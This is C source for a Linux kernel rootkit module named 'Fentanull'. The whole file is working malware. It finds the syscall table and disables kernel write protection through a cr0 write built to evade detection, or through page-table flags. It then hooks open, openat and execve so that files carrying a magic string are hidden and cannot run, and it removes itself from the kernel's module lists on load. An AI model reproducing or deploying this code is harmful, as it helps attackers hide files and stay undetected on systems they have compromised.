#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>  
#include <linux/unistd.h>   
#include <asm/paravirt.h>   
#include <asm/pgtable.h>     
#include <asm/uaccess.h> /* for copy_from_user */ 
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include "consts.h" 
/*#include "utils/keylogger.c"*/

MODULE_AUTHOR("cow");
MODULE_LICENSE("GPL");

typedef asmlinkage int (*old_openat_type)(int dirfd, const char *pathname, int flags, mode_t mode);
typedef asmlinkage int (*old_open_type)(const char *pathname, int flags, mode_t mode); 
typedef asmlinkage int (*old_getdents_type)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
typedef asmlinkage int (*old_getdents64_type)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); 
typedef asmlinkage int (*old_execve_type)(const char *filename, char *const argv[], char *const envp[]);
typedef asmlinkage int (*old_kill_type)(pid_t pid, int sig); 

old_open_type old_open; 
old_openat_type old_openat;
old_getdents_type old_getdents; 
old_getdents64_type old_getdents64; 
old_execve_type old_execve; 
old_kill_type old_kill; 


struct fentanull_info 
{ 
	int mod;  
	int files; 
};

static unsigned long *sys_call_table; 
pte_t *pte; 
struct fentanull_info hidden; 


/* the kernel will know if WP in cr0 has been modified in write_cr0, 
 * so we need to create our own vesion to bypass the detection */

inline void custom_write_cr0(unsigned long cr0)
{ 
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void cr0_enable(int mode)
{ 
	switch(mode)
	{
		case 1: 
		{
			unsigned long cr0 = read_cr0();
			custom_write_cr0(cr0 & (~0x00010000));
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); 
			#endif 	
			break;
		}
		case 0: 
		{	
			unsigned long cr0 = read_cr0();
			custom_write_cr0(cr0 | (0x00010000));
			#ifdef DEBUG
			printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); 
			#endif
			break;
		}
	}
	return;
} 

void mod_hide(void)
{ 
	/* removing fentanull from procfs and sysfs */ 
	list_del(&THIS_MODULE->list); 
	kobject_del(&THIS_MODULE->mkobj.kobj); 
	THIS_MODULE->sect_attrs = NULL; 
	THIS_MODULE->notes_attrs = NULL; 
	hidden.mod = 1; 
}

/*========== EXECVE ============ */

asmlinkage int fentanull_execve(const char *filename, char *const argv[], char *const envp[])
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: execve hooked\n");
	#endif 
	if ((hidden.mod & hidden.files) == 1)
		return old_execve(filename, argv, envp);
	else 
	{
		char *kfilename; 
		kfilename = (char *)kmalloc(256, GFP_KERNEL); 
		raw_copy_from_user(kfilename, filename, 255); 
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk[execve][1]: %s", kfilename);
		printk(KERN_ALERT "[-] rk[execve][2]: %s", filename);
		#endif
		if (strstr(kfilename, MAGICSTR)!=NULL)
		{ 
			#ifdef DEBUG 
			printk(KERN_ALERT "[-] rk: hiding file"); 
			#endif 
			kfree(kfilename);
			return -ENOENT; 
		}
		else 
		{
			kfree(kfilename);
			return old_execve(filename, argv, envp);
		}
	}
} 

/*========== OPEN ============ */

asmlinkage int fentanull_open(const char *pathname, int flags, mode_t mode)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: open called\n"); 
	#endif
	if ((hidden.mod & hidden.files) == 1)
		return old_open(pathname, flags, mode); 
	else {
		char *kpathname; 
		kpathname = (char *)kmalloc(256, GFP_KERNEL);
		raw_copy_from_user(kpathname, pathname, 255);
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk[open][1]: %s", kpathname);
		printk(KERN_ALERT "[-] rk[open][2]: %s", pathname);
		#endif
		if (strstr(kpathname, MAGICSTR)!=NULL)
		{
			#ifdef DEBUG 
			printk(KERN_ALERT "[-] rk: hiding file\n");
			#endif
			kfree(kpathname);
			return -ENOENT;
		}
		else
		{
			kfree(kpathname);
			return old_open(pathname, flags, mode);
		}
	}
}

/*========== OPENAT ============ */
asmlinkage int fentanull_openat(int dirfd, const char *pathname, int flags, mode_t mode)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: openat called\n"); 
	#endif
	if ((hidden.mod & hidden.files) == 1)
		return old_openat(dirfd, pathname, flags, mode); 
	else {
		char *kpathname; 
		kpathname = (char *)kmalloc(256, GFP_KERNEL);
		raw_copy_from_user(kpathname, pathname, 255);
		#ifdef DEBUG
		printk(KERN_ALERT "[-] rk[openat][1]: %s", kpathname);
		printk(KERN_ALERT "[-] rk[openat][2]: %s", pathname);
		#endif
		if (strstr(kpathname, MAGICSTR)!=NULL)
		{
			#ifdef DEBUG 
			printk(KERN_ALERT "[-] rk: hiding file\n");
			#endif
			kfree(kpathname);
			return -ENOENT;
		}
		else
		{
			kfree(kpathname);
			return old_openat(dirfd, pathname, flags, mode);
		}
	}
}

/*=========== HOOKS ========== */

void set_openat(int hook, int method)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: hooking openat using cr0\n"); 
				#endif 
				/* WP off, write enabled */
				/* swapping syscalls */ 
				old_openat = (old_openat_type)sys_call_table[__NR_openat]; 
				cr0_enable(1);
				sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
				printk(KERN_ALERT "[-] rk: openat hooked\n");
				#endif
				cr0_enable(0);
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: hooking openat using pte\n"); 
				#endif 
				/* bitwise OR, write enabled */
				pte->pte |= _PAGE_RW; 
				/* swapping syscalls */ 
				old_openat = (old_openat_type)sys_call_table[__NR_openat]; 
				sys_call_table[__NR_openat] = (unsigned long)fentanull_openat; 
				pte->pte &= ~_PAGE_RW;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat); 
				printk(KERN_ALERT "[-] rk: openat hooked\n"); 
				#endif
				break;
			}
		}
	}
	else
	{
		/* unhook it */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: unhooking openat using cr0\n"); 
				#endif 
				cr0_enable(1);
				/* swapping syscalls */ 
				sys_call_table[__NR_openat] = (unsigned long)old_openat;
				/* WP on, write disabled */	
				cr0_enable(0);
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
				printk(KERN_ALERT "[-] rk: openat unhooked\n");
				#endif
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: unhooking openat using pte\n"); 
				#endif 
				pte->pte |= _PAGE_RW;
				/* swapping syscalls */ 
				sys_call_table[__NR_openat] = (unsigned long)old_openat;
				/* bitwise AND, write disabled */ 
				pte->pte &= ~_PAGE_RW;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
				printk(KERN_ALERT "[-] rk: openat unhooked\n");
				#endif
				break;
			}		
		}
	}
}


void set_open(int hook, int method)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: hooking open using cr0\n"); 
				#endif 
				/* WP off, write enabled */
				/* swapping syscalls */ 
				old_open = (old_open_type)sys_call_table[__NR_open]; 
				cr0_enable(1);
				sys_call_table[__NR_open] = (unsigned long)fentanull_open;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: open hooked\n");
				#endif
				cr0_enable(0);
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: hooking open using pte\n"); 
				#endif 
				/* bitwise OR, write enabled */
				pte->pte |= _PAGE_RW; 
				/* swapping syscalls */ 
				old_open = (old_open_type)sys_call_table[__NR_open]; 
				sys_call_table[__NR_open] = (unsigned long)fentanull_open; 
				pte->pte &= ~_PAGE_RW;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open); 
				printk(KERN_ALERT "[-] rk: open hooked\n"); 
				#endif
				break;
			}
		}
	}
	else
	{
		/* unhook it */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: unhooking open using cr0\n"); 
				#endif 
				cr0_enable(1);
				/* swapping syscalls */ 
				sys_call_table[__NR_open] = (unsigned long)old_open;
				/* WP on, write disabled */	
				cr0_enable(0);
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: open unhooked\n");
				#endif
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: unhooking open using pte\n"); 
				#endif 
				pte->pte |= _PAGE_RW;
				/* swapping syscalls */ 
				sys_call_table[__NR_open] = (unsigned long)old_open;
				/* bitwise AND, write disabled */ 
				pte->pte &= ~_PAGE_RW;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: open unhooked\n");
				#endif
				break;
			}		
		}
	}
}

void set_execve(int hook, int method)
{ 
	/* hook == 1: hook function 
	 * hook == 0: unhook function
	 * method == 1: use cr0
	 * method == 0: use pte */

	unsigned int lvl;
	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
	if (hook==1)
	{
		/* HOOK ITTTTT */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: hooking execve using cr0\n"); 
				#endif 
				old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
				/* WP off, write enabled */
				cr0_enable(1);
				/* swapping syscalls */ 
				old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
				sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;
				cr0_enable(0);
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: execve located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: execve hooked\n");
				#endif
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: hooking execve using pte\n"); 
				#endif 
				/* bitwise OR, write enabled */
				pte->pte |= _PAGE_RW; 
				/* swapping syscalls */ 
				old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
				sys_call_table[__NR_execve] = (unsigned long)fentanull_execve; 
				/* bitwase AND, write disabled */ 
				pte->pte &= ~_PAGE_RW;
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: execve located at %p\n", old_open); 
				printk(KERN_ALERT "[-] rk: execve hooked\n"); 
				#endif
				break;
			}
		}
	}
	else
	{
		/* unhook it */
		switch (method)
		{
			/* cr0 method */
			case 1:
			{	
				#ifdef DEBUG 
				printk(KERN_ALERT "[-] rk: unhooking execve using cr0\n"); 
				#endif 
				cr0_enable(1);
				/* swapping syscalls */ 
				sys_call_table[__NR_execve] = (unsigned long)old_execve;
				/* WP on, write disabled */	
				cr0_enable(0);
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: execve located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: execve unhooked\n");
				#endif
				break;
			}
			/* pte method */
			case 0: 
			{ 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: unhooking execve using pte\n"); 
				#endif 
				/* bitwise OR, write enabled */
				pte->pte |= _PAGE_RW; 
				/* swapping syscalls */ 
				sys_call_table[__NR_execve] = (unsigned long)old_execve;
				/* bitwise AND, write disabled */ 
				pte->pte &= ~_PAGE_RW; 
				#ifdef DEBUG
				printk(KERN_ALERT "[-] rk: execve located at %p\n", old_open);
				printk(KERN_ALERT "[-] rk: execve unhooked\n");
				#endif
				break;
			}		
		}
	}
}

static int __init fentanull_init(void)
{ 
	#ifdef DEBUG 
	printk(KERN_ALERT "[-] rk: Fentanull initialized.\n");
	#endif
	memset(&hidden, 0x0, sizeof(hidden));
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table"); 
	if (sys_call_table == NULL)
	{ 
		#ifdef DEBUG
		printk(KERN_ERR "[!] rk: sys_call_table == NULL.\n"); 
		#endif 
		return -1; 
	}
	else 
	{
		/* comment this out for debugging */ 
		mod_hide(); 		
		set_openat(1, 1); 
		set_open(1, 1); 
		set_execve(1, 1); 
		return 0;	       
	}
}


static void __exit fentanull_exit(void)
{ 
	#ifdef DEBUG
	printk(KERN_ALERT "[-] rk: Fentanull is exiting...\n"); 
	#endif 
	set_openat(0, 1); 
	set_open(0, 1); 
	set_execve(0, 1); 
} 

module_init(fentanull_init);
module_exit(fentanull_exit);
